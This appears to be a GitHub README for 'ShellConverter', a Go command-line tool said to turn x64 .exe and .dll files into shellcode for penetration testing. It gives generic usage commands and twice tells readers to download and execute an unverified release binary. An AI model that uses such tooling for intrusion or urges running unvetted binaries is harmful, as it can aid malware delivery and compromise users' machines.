# ShellConverter: Transform Your Executables and DLLs to Shellcode x64 🐚

![ShellConverter](https://img.shields.io/badge/ShellConverter-v1.0-blue.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)

Welcome to **ShellConverter**, a straightforward tool designed to convert `.exe` and `.dll` files into x64 shellcode. This project is built with simplicity and efficiency in mind, allowing users to quickly transform their files for various applications in security research and penetration testing.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Supported Formats](#supported-formats)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

## Features

- Convert `.exe` and `.dll` files to x64 shellcode.
- Simple command-line interface.
- Fast and efficient processing.
- Supports various shellcode formats.
- Built using Go for performance and reliability.

## Installation

To get started with ShellConverter, follow these steps:

1. **Download the latest release** from the [Releases section](https://github.com/IvonaPetrovic6/shellconverter/releases). You will need to download and execute the appropriate file for your operating system.
2. **Extract the files** if they are compressed.
3. **Run the executable** or script as per your operating system's requirements.

## Usage

Using ShellConverter is straightforward. After installation, you can run the tool from your command line. Here’s a simple command to get you started:

```bash
shellconverter <path_to_your_file>
```

Replace `<path_to_your_file>` with the path to the `.exe` or `.dll` file you want to convert. The tool will output the corresponding shellcode.

## Supported Formats

ShellConverter supports the following formats:

- **Executable Files**: `.exe`
- **Dynamic Link Libraries**: `.dll`

The tool is optimized for x64 architecture, ensuring high compatibility and performance.

## Examples

Here are a few examples of how to use ShellConverter effectively:

### Example 1: Convert an Executable

To convert an executable file named `example.exe`, run:

```bash
shellconverter example.exe
```

### Example 2: Convert a DLL

To convert a DLL file named `example.dll`, use:

```bash
shellconverter example.dll
```

The output will be displayed in the console, ready for your use.

## Contributing

We welcome contributions to ShellConverter! If you want to help improve the project, please follow these steps:

1. **Fork the repository**.
2. **Create a new branch** for your feature or bug fix.
3. **Make your changes** and commit them.
4. **Push your changes** to your forked repository.
5. **Create a pull request** explaining your changes.

## License

ShellConverter is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For any inquiries or support, please reach out via the issues section on GitHub or contact the repository owner directly.

## Releases

To download the latest version of ShellConverter, visit the [Releases section](https://github.com/IvonaPetrovic6/shellconverter/releases). Download and execute the file that suits your needs.

---

Thank you for using ShellConverter! We hope this tool simplifies your workflow in converting executables and DLLs to shellcode. Happy coding!